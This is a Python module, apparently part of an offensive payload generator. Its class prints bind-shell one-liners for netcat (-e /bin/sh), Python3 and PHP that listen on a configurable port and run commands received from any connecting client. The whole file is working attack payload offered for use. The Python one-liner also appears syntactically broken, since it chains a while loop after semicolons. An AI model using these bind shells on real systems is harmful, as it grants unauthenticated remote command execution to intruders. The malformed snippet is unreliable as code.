from core.core import *
class bind:

	def __init__(self,lport='9001'):
		self.lport=lport

	def get(self):
		return f'''
{TerminalColor.Orange}#NETCAT BIND{TerminalColor.Reset}
{TerminalColor.Cyan}nc -lvp {TerminalColor.Green}{self.lport}{TerminalColor.Cyan} -e /bin/sh{TerminalColor.Reset}

{TerminalColor.Orange}#PYTHON3 BIND{TerminalColor.Reset}
{TerminalColor.Cyan}python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan}));s1.listen(1);c,a=s1.accept();while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'{TerminalColor.Reset}

{TerminalColor.Orange}#PHP BIND{TerminalColor.Reset}
{TerminalColor.Cyan}php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{TerminalColor.Green}{self.lport}{TerminalColor.Cyan});socket_listen($s,1);$cl=socket_accept($s);while(1)''' +'{if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}\n'+f'{TerminalColor.Reset}'
